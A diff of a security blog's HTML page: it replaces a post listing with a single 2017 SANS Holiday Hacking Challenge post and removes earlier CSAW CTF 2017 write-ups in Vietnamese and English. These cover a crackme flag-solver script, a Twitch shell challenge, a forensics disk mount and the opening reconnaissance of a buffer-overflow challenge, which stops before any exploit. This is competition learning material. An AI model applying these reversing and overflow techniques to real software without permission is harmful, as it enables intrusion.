@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+	<!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml"  xml:lang="en-us" lang="en-us" >
 
 <head>
@@ -7,7 +7,7 @@
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"> 
-  <title>simpleguy.tech</title>
+  <title>2017 SANS Holiday Hacking Challenge &middot; simpleguy.tech</title>
   
 
   
@@ -21,11 +21,10 @@
   <link rel="shortcut icon" href="/favicon.png">
 
   
-  <link href="http://simpleguy.tech/index.xml" rel="alternate" type="application/rss+xml" title="simpleguy.tech" />
+  <link href="" rel="alternate" type="application/rss+xml" title="simpleguy.tech" />
 </head>
-<body class=" ">
-
-<div class="sidebar">
+	<body class=" ">
+		<div class="sidebar">
   <div class="container sidebar-sticky">
     <div class="sidebar-about">
       <a href="http://simpleguy.tech/"><h1>simpleguy.tech</h1></a>
@@ -54,20 +53,11 @@
 </div>
 
 
-    <div class="content container">
-<div class="posts">
-
-      
-  <div class="post">
-    <h1 class="post-title">
-      <a href="http://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/">
-        2017 SANS Holiday Hacking Challenge
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Dec 16, 2017</span>
-
-    
+		<div class="content container">
+			<div class="post">
+			 	<h1>2017 SANS Holiday Hacking Challenge</h1>
+			  <span class="post-date">Sat, Dec 16, 2017</span>
+			      
 
 <p><a href="#HHC17-Terminal">Terminal Challenges</a></p>
 
@@ -661,501 +651,51 @@ For hints on solving this challenge, please locate Wunorse Openslae in the North
 
 To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond. -->
 
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="http://simpleguy.tech/post/csaw-ctf-17-re100-tablez/">
-        [CSAW CTF 17] RE100: Tablez
-      </a>
-    </h1>
+			</div>
+			<div id="meta-data">
+				
+				<ul id="tags">
+					Tags:
+					
+					<li><a href="/tags/sans">SANS</a> </li>
+					
+					<li><a href="/tags/hhc">HHC</a> </li>
+					
+				</ul>
+				<p></p>
+				
 
-    <span class="post-date">Sun, Oct 22, 2017</span>
+				
+				<ul id="categories">
+					Topics:
+					
+					<li><a href="/categories/pentest">pentest</a> </li>
+					
+				</ul>
+				<p></p>
+				
 
-    
+				
+				
+			</div>
+			
+				<h2>Comments</h2>
+				<div id="disqus_thread"></div>
+<script type="text/javascript">
+     
+    var disqus_shortname = 'asimpleguy'; 
 
-<p><a href="#english-tablez">English version below</a></p>
-
-<h5 id="vietnamese">Vietnamese</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  file tablez 
-</span><span style="">tablez</span><span style="color:#f92672">:</span><span style=""> ELF </span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span><span style="">bit LSB shared object</span><span style="">,</span><span style=""> x86</span><span style="color:#ae81ff">-64</span><span style="">,</span><span style=""> version </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="">(</span><span style="">SYSV</span><span style="">),</span><span style=""> dynamically linked</span><span style="">,</span><span style=""> interpreter </span><span style="color:#f92672">/</span><span style="">lib64</span><span style="color:#f92672">/</span><span style="">ld</span><span style="color:#f92672">-</span><span style="">linux</span><span style="color:#f92672">-</span><span style="">x86</span><span style="color:#ae81ff">-64.</span><span style="">so.2</span><span style="">,</span><span style=""> </span><span style="color:#66d9ef">for</span><span style=""> GNU</span><span style="color:#f92672">/</span><span style="">Linux </span><span style="color:#ae81ff">3.2.0</span><span style="">,</span><span style=""> BuildID</span><span style="">[</span><span style="">sha1</span><span style="">]</span><span style="color:#f92672">=</span><span style="color:#ae81ff">72</span><span style="">adea86090fb7deeb319e95681fd2c669dcc503</span><span style="">,</span><span style=""> not stripped</span></code></pre>
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 </div>
-<p>Như vậy rất may mắn là binary này không bị stripped. Mở binary lên bằng r2 và xem qua hàm main thì có một số điểm đáng chú ý sau:</p>
-
-<ol>
-<li>Dữ liệu được hardcoded từ <code>0x000008ba</code> tới <code>0x00000908</code></li>
-<li>Input được nhập vào biến <code>local_90h</code> ở <code>0x00000924</code></li>
-<li>Một vòng lặp gọi hàm <code>sym.get_tbl_entry</code> với tham số là input. Kết quả hàm này trả về được dùng để thay thế các ký tự trên input buffer.</li>
-<li>input buffer sau khi bị biến đổi qua vòng lặp ở 3 sẽ được so sánh với dữ liệu hardcoded ở 1 bằng hàm strncmp (<code>0x000009f7</code>). <code>0x26</code> ký tự đầu tiên sẽ được so sánh.</li>
-</ol>
-
-<p>Hàm <code>sym.get_tbl_entry</code> hoạt động như sau:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">for</span><span style=""> </span><span style="">(</span><span style="color:#66d9ef">int</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">;</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">&lt;=</span><span style=""> </span><span style="color:#ae81ff">0xfe</span><span style="">;</span><span style=""> </span><span style="">i</span><span style="color:#f92672">++</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">  </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">(</span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style="">]</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">input</span><span style="">[</span><span style="">i</span><span style="">])</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">];</span><span style="">
-</span><span style="">  </span><span style="">}</span><span style="">
-</span><span style=""></span><span style="">}</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">;</span></code></pre>
-</div>
-<p>với <code>trans_tbl</code> là một biến toàn cục đã được viết trước.</p>
-
-<p>Như vậy, cách làm của mình như sau:</p>
-
-<ol>
-<li>Lấy dữ liệu từ bản trans_tbl và dự liệu hardcode trong hàm main ra (mình gọi là password).
-Để lấy dữ liệu từ bảng <code>obj.trans_tbl</code>: <code>pr 0xff@ obj.trans_tbl &gt; data.bin</code>
-(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)</li>
-<li>Với mỗi ký tự trong password, bruteforce tất cả các ký tự ASCII để tìm một ký tự c sao cho c sau khi qua hàm <code>get_tbl_entry</code> sẽ biến đổi thành ký tự ở vị trí tương ứng trong password.</li>
-</ol>
-
-<p>Solution:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span><span style=""> </span><span style="">pwn</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="color:#f92672">*</span><span style="">
-</span><span style=""></span><span style="color:#f92672">from</span><span style=""> </span><span style="">string</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="">printable</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">def</span><span style=""> </span><span style="color:#a6e22e">get_char</span><span style="">(</span><span style="">c</span><span style="">):</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">global</span><span style=""> </span><span style="">trans_tbl</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">range</span><span style="">(</span><span style="color:#ae81ff">0xfe</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">):</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style="">]</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">c</span><span style="">:</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">]</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">trans_tbl</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">open</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;trans_tbl&#39;</span><span style="">)</span><span style="color:#f92672">.</span><span style="">read</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xb1e711f59d73b327</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0x30f4f9f9b399beb3</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xb19965237399711b</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xf9279923be111165</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0x65059923</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">password</span><span style="color:#f92672">.</span><span style="">strip</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">flag</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">range</span><span style="">(</span><span style="">len</span><span style="">(</span><span style="">password</span><span style="">)):</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">c</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">printable</span><span style="">:</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">get_char</span><span style="">(</span><span style="">c</span><span style="">)</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">password</span><span style="">[</span><span style="">i</span><span style="">]:</span><span style="">
-</span><span style="">            </span><span style="">flag</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">c</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">break</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="">flag</span></code></pre>
-</div>
-<p><a name="english-tablez"></a></p>
-
-<h5 id="english">English</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  file tablez 
-</span><span style="">tablez</span><span style="color:#f92672">:</span><span style=""> ELF </span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span><span style="">bit LSB shared object</span><span style="">,</span><span style=""> x86</span><span style="color:#ae81ff">-64</span><span style="">,</span><span style=""> version </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="">(</span><span style="">SYSV</span><span style="">),</span><span style=""> dynamically linked</span><span style="">,</span><span style=""> interpreter </span><span style="color:#f92672">/</span><span style="">lib64</span><span style="color:#f92672">/</span><span style="">ld</span><span style="color:#f92672">-</span><span style="">linux</span><span style="color:#f92672">-</span><span style="">x86</span><span style="color:#ae81ff">-64.</span><span style="">so.2</span><span style="">,</span><span style=""> </span><span style="color:#66d9ef">for</span><span style=""> GNU</span><span style="color:#f92672">/</span><span style="">Linux </span><span style="color:#ae81ff">3.2.0</span><span style="">,</span><span style=""> BuildID</span><span style="">[</span><span style="">sha1</span><span style="">]</span><span style="color:#f92672">=</span><span style="color:#ae81ff">72</span><span style="">adea86090fb7deeb319e95681fd2c669dcc503</span><span style="">,</span><span style=""> not stripped</span></code></pre>
-</div>
-<p>Fortunately, this binary is not stripped. After examining the main function, there are several noticeable points:</p>
-
-<ol>
-<li>There is hardcoded data, seen from <code>0x000008ba</code> to <code>0x00000908</code></li>
-<li>The input buffer is <code>local_90h</code>, seen at <code>0x00000924</code></li>
-<li>A loop calls to <code>sym.get_tbl_entry</code> with the input buffer as the parameter. The returned results are used to replace data on the input buffer.</li>
-<li>The input buffer after being transformed in #3 is compared to the hardcoded data in #1 using strncmp (<code>0x000009f7</code>). The first <code>0x26</code> characters are compared.</li>
-</ol>
-
-<p>Pseudo code for <code>sym.get_tbl_entry</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">for</span><span style=""> </span><span style="">(</span><span style="color:#66d9ef">int</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">;</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">&lt;=</span><span style=""> </span><span style="color:#ae81ff">0xfe</span><span style="">;</span><span style=""> </span><span style="">i</span><span style="color:#f92672">++</span><span style="">)</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">  </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">(</span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style="">]</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">input</span><span style="">[</span><span style="">i</span><span style="">])</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">];</span><span style="">
-</span><span style="">  </span><span style="">}</span><span style="">
-</span><span style=""></span><span style="">}</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">;</span></code></pre>
-</div>
-<p>with <code>trans_tbl</code> is an initialized global variable.</p>
-
-<p>My solution:</p>
-
-<ol>
-<li>Extract data from <code>trans_tbl</code> and the hardcoded data at the beginning of main (called password).
-To extract data from <code>obj.trans_tbl</code> using r2: <code>pr 0xff@ obj.trans_tbl &gt; data.bin</code>
-(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)</li>
-<li>For each character in the password, bruteforce all ASCII characters to find a character c such that c after being transformed by <code>get_tbl_entry</code> will be the corressponding character in the password.</li>
-</ol>
-
-<p>Solution:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span><span style=""> </span><span style="">pwn</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="color:#f92672">*</span><span style="">
-</span><span style=""></span><span style="color:#f92672">from</span><span style=""> </span><span style="">string</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="">printable</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">def</span><span style=""> </span><span style="color:#a6e22e">get_char</span><span style="">(</span><span style="">c</span><span style="">):</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">global</span><span style=""> </span><span style="">trans_tbl</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">range</span><span style="">(</span><span style="color:#ae81ff">0xfe</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">):</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style="">]</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">c</span><span style="">:</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="">trans_tbl</span><span style="">[</span><span style="">i</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#ae81ff">1</span><span style="">]</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">0</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">trans_tbl</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">open</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;trans_tbl&#39;</span><span style="">)</span><span style="color:#f92672">.</span><span style="">read</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xb1e711f59d73b327</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0x30f4f9f9b399beb3</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xb19965237399711b</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0xf9279923be111165</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="color:#ae81ff">0x65059923</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">password</span><span style="color:#f92672">.</span><span style="">strip</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">flag</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">i</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">range</span><span style="">(</span><span style="">len</span><span style="">(</span><span style="">password</span><span style="">)):</span><span style="">
-</span><span style="">    </span><span style="color:#66d9ef">for</span><span style=""> </span><span style="">c</span><span style=""> </span><span style="color:#f92672">in</span><span style=""> </span><span style="">printable</span><span style="">:</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">if</span><span style=""> </span><span style="">get_char</span><span style="">(</span><span style="">c</span><span style="">)</span><span style=""> </span><span style="color:#f92672">==</span><span style=""> </span><span style="">password</span><span style="">[</span><span style="">i</span><span style="">]:</span><span style="">
-</span><span style="">            </span><span style="">flag</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">c</span><span style="">
-</span><span style="">            </span><span style="color:#66d9ef">break</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="">flag</span></code></pre>
-</div>
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="http://simpleguy.tech/post/csaw-ctf-17-misc100-twitch/">
-        [CSAW CTF 17] Misc100: Twitch
-      </a>
-    </h1>
-
-    <span class="post-date">Sun, Oct 22, 2017</span>
-
-    
-
-<p><a href="#english-twitch">English version here</a></p>
-
-<h5 id="vietnamese">Vietnamese</h5>
-
-<p>Bài này là bài bựa nhất trong cả đề. Đại khái là họ stream một cái shell lên twitch. Để điều khiển shell đó thì người xem twitch sẽ vote phím nào được ấn trên bàn phím bằng cách gõ vào phần chat. Để lấy được flag bài này thì số người đó phải exploit 1 binary bị buffer overflow. Mình thì không rảnh nhảy vào vote nên chỉ xem xong cướp flag thôi =)) Điều bựa là mỗi khi flag được lấy ra thành công thì sau vài phút, cái máy tính được stream sẽ tự động reboot và ai không lấy kịp flag thì lại ngồi chờ =))
-<img src="img/csaw-ctf-qualification-2017/misc100.jpg" alt="misc100" /></p>
-
-<p><a name="english-twitch"></a></p>
-
-<h5 id="english">English</h5>
-
-<p>This is quite a funny challenge. All the players need to exploit a binary and the shell is streamed on twitch and controlled via a twitch chat. All the players need to vote for the character that they want to type in the shell. To get the flag, you need to be there at the right moment since the machine which contains the binary and the shell reboots whenever the flag is successfully printed out.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="http://simpleguy.tech/post/csaw-ctf-17-for200-bestrouter/">
-        [CSAW CTF 17] Forensics 200: Bestrouter
-      </a>
-    </h1>
-
-    <span class="post-date">Sun, Oct 22, 2017</span>
-
-    <p>Bài này khá vớ vẩn. Download file đính kèm về giải nén ra thì ta sẽ được một file <code>.img</code>, là một file image của rasberry pi. Mình dùng lệnh sau để mount file này trên linux, từ đó sẽ đọc được dữ liệu trong file như cấu trúc của một linux filesystem thông thường:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">sudo mount disk.img </span><span style="color:#ae81ff">.</span><span style="color:#f92672">/</span><span style="">mnt</span></code></pre>
-</div>
-<p>(Lúc làm bài này mình làm theo hướng dẫn ở <a href="https://www.linuxquestions.org/questions/linux-general-1/how-to-mount-img-file-882386/#post4365399">đây</a>, thi xong mình xóa xừ nó file kia đi rồi nên không nhớ cụ thể câu lệnh là gì nữa :P )</p>
-
-<p>Mở lên và truy cập vào thư mục <code>/var/www/html</code> sẽ thấy được mã nguồn của trang web cần đăng nhập: <code>http://forensics.chal.csaw.io:3287/</code>
-Trên windows, file này có thể được mở bằng phần mềm chuyên dụng cho forensics như Autopsy. Bài này do ngu người không để ý có cái trang web kia nên mình tìm thấy mật khẩu rồi mãi không biết dùng làm gì :D</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="http://simpleguy.tech/post/csaw-ctf-17-pwn75-pilot/">
-        [CSAW CTF 17] pwn75: pilot
-      </a>
-    </h1>
-
-    <span class="post-date">Wed, Sep 20, 2017</span>
-
-    
-
-<p><img src="/img/csaw-ctf-qualification-2017/scoreboard.png" alt="header" /></p>
-
-<p><a href="#english-pilot">English version here</a></p>
-
-<h5 id="vietnamese">Vietnamese</h5>
-
-<p>Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (<a href="https://pwneris.me">quangltm</a> và anh <a href="http://www.hardtobelieve.me/">tuanit96</a>), mình đã quẩy được vài bài khá cơ bản.</p>
-
-<p>Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  file pilot
-</span><span style="">pilot</span><span style="color:#f92672">:</span><span style=""> ELF </span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span><span style="">bit LSB executable</span><span style="">,</span><span style=""> x86</span><span style="color:#ae81ff">-64</span><span style="">,</span><span style=""> version </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="">(</span><span style="">SYSV</span><span style="">),</span><span style=""> dynamically linked</span><span style="">,</span><span style=""> interpreter </span><span style="color:#f92672">/</span><span style="">lib64</span><span style="color:#f92672">/</span><span style="">ld</span><span style="color:#f92672">-</span><span style="">linux</span><span style="color:#f92672">-</span><span style="">x86</span><span style="color:#ae81ff">-64.</span><span style="">so.2</span><span style="">,</span><span style=""> </span><span style="color:#66d9ef">for</span><span style=""> GNU</span><span style="color:#f92672">/</span><span style="">Linux </span><span style="color:#ae81ff">2.6.32</span><span style="">,</span><span style=""> BuildID</span><span style="">[</span><span style="">sha1</span><span style="">]</span><span style="color:#f92672">=</span><span style="color:#ae81ff">6</span><span style="">ed26a43b94fd3ff1dd15964e4106df72c01dc6c</span><span style="">,</span><span style=""> stripped</span></code></pre>
-</div>
-<p>Như vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì sẽ rất thốn, nhưng lát nữa mình sẽ giới thiệu 1 tool cực hay mà mình tìm thấy để giúp việc debug stripped binaries đỡ thốn hơn 10000 lần.</p>
-
-<p>Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  checksec pilot 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style=""> </span><span style="color:#e6db74">&#39;/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot&#39;</span><span style="">
-</span><span style="">    Arch</span><span style="color:#f92672">:</span><span style="">     amd64</span><span style="color:#ae81ff">-64</span><span style="color:#f92672">-</span><span style="">little
-</span><span style="">    RELRO</span><span style="color:#f92672">:</span><span style="">    Partial RELRO
-</span><span style="">    Stack</span><span style="color:#f92672">:</span><span style="">    No canary found
-</span><span style="">    NX</span><span style="color:#f92672">:</span><span style="">       NX disabled
-</span><span style="">    PIE</span><span style="color:#f92672">:</span><span style="">      No PIE </span><span style="">(</span><span style="color:#ae81ff">0x400000</span><span style="">)</span><span style="">
-</span><span style="">    RWX</span><span style="color:#f92672">:</span><span style="">      Has RWX segments</span></code></pre>
-</div>
-<p>Chạy chương trình ra output như sau:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  </span><span style="color:#ae81ff">.</span><span style="color:#f92672">/</span><span style="">pilot
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Welcome DropShip Pilot...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I am your assitant A.I....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I will be guiding you through the tutorial....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">As a first step</span><span style="">,</span><span style=""> lets learn how to land at the designated location....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines </span><span style="color:#f92672">&amp;</span><span style=""> Medics...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Good Luck Pilot</span><span style="color:#f92672">!</span><span style="color:#ae81ff">.</span><span style="color:#66d9ef">...</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Location</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x7fff0ef02250</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Command</span><span style="color:#f92672">:</span></code></pre>
-</div>
-<p>Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào&hellip;</p>
